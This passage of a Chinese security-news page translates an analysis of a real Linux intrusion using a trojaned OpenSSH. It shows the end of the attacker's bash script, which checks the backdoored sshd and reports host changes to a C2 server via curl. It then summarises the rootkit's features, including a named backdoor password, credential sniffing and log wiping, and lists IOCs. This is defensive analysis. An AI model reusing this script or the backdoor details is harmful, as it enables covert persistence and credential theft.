+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sshd_changed=&quot;YES&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;fi
+&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;cineva&nbsp;a&nbsp;sters&nbsp;fisierul&nbsp;nostru&nbsp;de&nbsp;rk&nbsp;(backup-ul)
+&nbsp;&nbsp;&nbsp;&nbsp;changes=1
+&nbsp;&nbsp;&nbsp;&nbsp;sshd_backup_missing=&quot;YES&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;sshd_changed=&quot;UNKNOWN&quot;
+&nbsp;&nbsp;&nbsp;fi
+&nbsp;&nbsp;&nbsp;#&nbsp;EOF&nbsp;verificam&nbsp;daca&nbsp;mai&nbsp;exista&nbsp;backup-ul&nbsp;la&nbsp;sshd-ul&nbsp;nostru&nbsp;si&nbsp;il&nbsp;comparam&nbsp;cu&nbsp;/usr/sbin/sshd
+&nbsp;&nbsp;&nbsp;#######&nbsp;verificam&nbsp;daca&nbsp;sshd&nbsp;e&nbsp;pornit,&nbsp;daca&nbsp;nu,&nbsp;il&nbsp;pornim&nbsp;noi
+&nbsp;&nbsp;&nbsp;sshd_process=`ps&nbsp;x&nbsp;|&nbsp;grep&nbsp;-v&nbsp;grep|grep&nbsp;sshd`
+&nbsp;&nbsp;&nbsp;if&nbsp;[[&nbsp;-z&nbsp;$sshd_process&nbsp;]];&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;echo&nbsp;&quot;nu&nbsp;ruleaza&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;/usr/sbin/sshd&nbsp;1&gt;&gt;/dev/null&nbsp;2&gt;&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;nu&nbsp;mai&nbsp;dau&nbsp;notificare&nbsp;daca&nbsp;am&nbsp;pornit&nbsp;eu&nbsp;sshd
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;changes=1
+&nbsp;&nbsp;&nbsp;fi
+&nbsp;&nbsp;&nbsp;#&nbsp;EOF&nbsp;verificam&nbsp;daca&nbsp;sshd&nbsp;e&nbsp;pornit,&nbsp;daca&nbsp;nu,&nbsp;il&nbsp;pornim&nbsp;noi
+&nbsp;&nbsp;&nbsp;######&nbsp;verificam&nbsp;daca&nbsp;a&nbsp;fost&nbsp;cazut&nbsp;netul
+&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;-f&nbsp;/usr/lib/libu.a/h439302s&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;serverul&nbsp;a&nbsp;fost&nbsp;cazut
+&nbsp;&nbsp;&nbsp;&nbsp;changes=1
+&nbsp;&nbsp;&nbsp;&nbsp;srv_was_down=&quot;YES&quot;
+&nbsp;&nbsp;&nbsp;fi
+&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;#####&nbsp;DACA&nbsp;scriptul&nbsp;detecteaza&nbsp;schimbari,&nbsp;intram&nbsp;pe&nbsp;link
+&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;&quot;$changes&quot;&nbsp;=&nbsp;1&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;###&nbsp;trimitem&nbsp;datele&nbsp;catre&nbsp;server
+curl&nbsp;-s&nbsp;&quot;${url}/srv.php?ip=${ip}&amp;ip_changed=${ip_changed}&amp;sshd_changed=${sshd_changed}&amp;sshd_backup_missing=${sshd_backup_missing}&amp;srv_was_down=${srv_was_down}&amp;ptty_ver=${ptty_ver}&quot;&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null&nbsp;&amp;
+&nbsp;&nbsp;&nbsp;fi
+&nbsp;&nbsp;&nbsp;#&nbsp;EOF&nbsp;DACA&nbsp;scriptul&nbsp;detecteaza&nbsp;schimbari,&nbsp;intram&nbsp;pe&nbsp;link
+&nbsp;&nbsp;#&nbsp;EOF&nbsp;PORNIM&nbsp;RESTUL&nbsp;SCRIPTULUI
+&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;
+&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;#&nbsp;echo&nbsp;&quot;URL&nbsp;does&nbsp;NOT&nbsp;exist:&nbsp;$url_check_net&nbsp;-&nbsp;NU&nbsp;merge&nbsp;netul&quot;
+&nbsp;&nbsp;&nbsp;mkdir&nbsp;/usr/lib/libu.a/&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null&nbsp;##&nbsp;in&nbsp;caz&nbsp;ca&nbsp;ne-a&nbsp;sters&nbsp;cineva&nbsp;dir
+&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;srv&nbsp;was&nbsp;down&quot;&nbsp;&gt;&nbsp;/usr/lib/libu.a/h439302s&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/usr/lib/libu.a/h439302s
+&nbsp;&nbsp;fi
+&nbsp;&nbsp;#&nbsp;EOF&nbsp;continuam&nbsp;cu&nbsp;scriptul&nbsp;DOAR&nbsp;DACA&nbsp;merge&nbsp;netul,&nbsp;verificam&nbsp;pe&nbsp;google
+fi
+#&nbsp;EOF&nbsp;continuam&nbsp;cu&nbsp;scriptul&nbsp;DOAR&nbsp;DACA&nbsp;nu&nbsp;sunt&nbsp;useri&nbsp;activi&nbsp;pe&nbsp;server</pre><p><br/></p><p style="text-indent: 29px;line-height: 18px;background: white"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px; background-image: initial; background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: initial; background-repeat: initial;">最后，P3 脚本会运行一些命令和脚本来删除所有临时文件。</span><br/></p><p style="text-indent: 29px"><span style="font-size:19px;font-family:&#39;微软雅黑&#39;,&#39;sans-serif&#39;;color:#444444;background:white"><br/> <span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px; background: white;"><strong>总结：</strong></span></span></p><p style="margin-left:0;text-indent:37px"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68);">·<span style="background-color: rgb(255, 255, 255);">&nbsp;&nbsp;</span><span style="font-stretch: normal; color: rgb(68, 68, 68); font-family: Symbol; font-size: 13px; text-indent: 37px;">&nbsp;</span></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">后门功能：</span></span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 13px; font-family: Symbol; color: rgb(68, 68, 68);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;&nbsp;一个通用于不同平台和架构的Linux系统的root工具包</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;本地的root外壳程序</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;主要的SSHD二进制文件被一个恶意文件覆盖。此二进制文件中包含有后门密码以确保访问。此外，任何通过该密码进行的访问都不会被跟踪，这个密码是PRtestD</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">·&nbsp;&nbsp; 多重体系结构和模块化：</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;对涉及的不同脚本使用模块化处理办法</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;根据操作系统和体系结构的不同下载执行不同文件</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">·&nbsp;&nbsp; 嗅探功能：木马感染几个二进制文件，比如scp、sftp、 ssh，来窃取用户名和密码。</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">·&nbsp;&nbsp; 反鉴定功能：</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;删除日志文件来删除入侵证据&nbsp;(/var/log/messages, /var/log/secure, /var/log/lastlog, /var/log/wtmp)</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp; 修改文件时间戳</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">·&nbsp;&nbsp; Root工具包功能：</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;通过不同技术隐藏进程和文件</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">·&nbsp;&nbsp; C2C功能：</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;每小时与C&amp;C交互，通知系统中的任何变化（如：出现新IP）</span></p><p style="margin-left:0;text-indent:37px"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(68, 68, 68); background: white;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;·&nbsp;每小时与C&amp;C交互，以获取任何更新</span></p><p style="text-indent: 37px;background: white"><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;"><br/> <br/> 更新：对于SSHD二进制文件中的后门密码的最新分析。</span></p><h4 style="text-indent:37px;background:white"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 18px;">IOCs</span></h4><p style="text-indent: 37px"><span style="font-size:19px;font-family:&#39;微软雅黑&#39;,&#39;sans-serif&#39;;color:#444444;background:white"><br/> <span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px; background: white;">5.189.136.43<br/> http://gopremium.mooo.com/.../auto/p&nbsp;<br/> http://gopremium.mooo.com/.../auto/p1<br/> http://gopremium.mooo.com/.../auto/arm61.tgz<br/> http://gopremium.mooo.com/.../auto/arm71.tgz<br/> http://gopremium.mooo.com/.../auto/vyos.tgz<br/> http://gopremium.mooo.com/.../auto/vyos64.tgz<br/> http://gopremium.mooo.com/.../auto/edgeos.tgz<br/> http://gopremium.mooo.com/.../auto/edgeos64.tgz<br/> http://gopremium.mooo.com/.../auto/default.tgz<br/> http://gopremium.mooo.com/.../auto/p2<br/> http://gopremium.mooo.com/.../auto/p3<br/> http://gopremium.mooo.com/.../auto/side_files.tgz<br/> http://gopremium.mooo.com/.unix/return_ip.php<br/> http://gopremium.mooo.com/.unix/srvupdt.tgz<br/> http://gopremium.mooo.com/.unix/srvupdt_IDXYZ.tgz<br/> http://gopremium.mooo.com//.unix/srv.php<br/> <br/> /etc/X11/.pr<br/> /etc/pps<br/> /usr/bin/ptty<br/> /etc/init/env.conf (containing /usr/sbin/env)<br/> /usr/bin/events/events<br/> <br/> <br/> <br/> MD5 (arm61/arm61/run-libcheck) = 34976ac680474edd12d16d84470bd702<br/> MD5 (arm61/arm61/scp) = 5eb1b59dbcd806ce41858bf40e10cab0<br/> MD5 (arm61/arm61/sftp) = dce8fc0c3ddf0351e4e81f404b85d7bb<br/> MD5 (arm61/arm61/ssh) = aeae5ae324e118021cb7e7ee7d5e7a26<br/> MD5 (arm61/arm61/sshd) = 7aadb643f8345fb59e8998e18209f71a<br/> MD5 (arm61/arm61/sshd-eu) = 7aadb643f8345fb59e8998e18209f71a<br/> <br/> MD5 (vyos/vyos/scp) = 6797f4801407052832ff482d5b1acf06<br/> MD5 (vyos/vyos/sftp) = 2d3a350e5210255f89a61a082254233f<br/> MD5 (vyos/vyos/ssh) = 5b3193530738e8e658c5ab8f63b5ee0d<br/> MD5 (vyos/vyos/sshd-eu) = 142e4198e11d405899619d49cc6dc79c<br/> MD5 (vyos/vyos/test-sshd) = 142e4198e11d405899619d49cc6dc79c<br/> <br/> MD5 (vyos64/vyos64/scp) = 300f7413eb76bf6905df1f5182e52f9e<br/> MD5 (vyos64/vyos64/sftp) = 01a4f0f38096df67e13c6e9ed7ccc205<br/> MD5 (vyos64/vyos64/ssh) = 3e7dfbac340929fc54aa459cc7ad181b<br/> MD5 (vyos64/vyos64/sshd-eu) = b327add04800e05480a020af2ab993e0<br/> MD5 (vyos64/vyos64/test-sshd) = b327add04800e05480a020af2ab993e0<br/> <br/> <br/> MD5 (edgeos/edgeos/scp) = ce8e196db65bed7862d98d4a14283ae4<br/> MD5 (edgeos/edgeos/sftp) = 0e34c468857e5e3d66ec2f0bd223d38c<br/> MD5 (edgeos/edgeos/ssh) = 47f2e08da73bb5e5d6c61d347d1bfbf1<br/> MD5 (edgeos/edgeos/sshd-eu) = 4b4e7ccb1f015a107ac052ba25dfe94e<br/> MD5 (edgeos/edgeos/test-sshd) = 4b4e7ccb1f015a107ac052ba25dfe94e<br/> <br/> MD5 (edgeos64/edgeos64/scp) = 602793976e2f41b5a1942cfd2784d075<br/> MD5 (edgeos64/edgeos64/sftp) = e597cfee6f877e82339fab3e322d79b7<br/> MD5 (edgeos64/edgeos64/ssh) = d5f6794c3b41f1d7f12715ba3315fd7b<br/> MD5 (edgeos64/edgeos64/sshd) = 973eee9fae6e3a353286206da7a89904<br/> MD5 (edgeos64/edgeos64/sshd-eu) = 973eee9fae6e3a353286206da7a89904<br/> <br/> MD5 (edgeos64/edgeos64/test-sshd) = e597cfee6f877e82339fab3e322d79b7</span></span></p><p><br/></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-ii.html" target="_blank">原文链接：http://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-ii.html</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】解剖一次真正的 Linux 入侵（第二部分）︰ OpenSSH的木马病毒工具 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3052" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
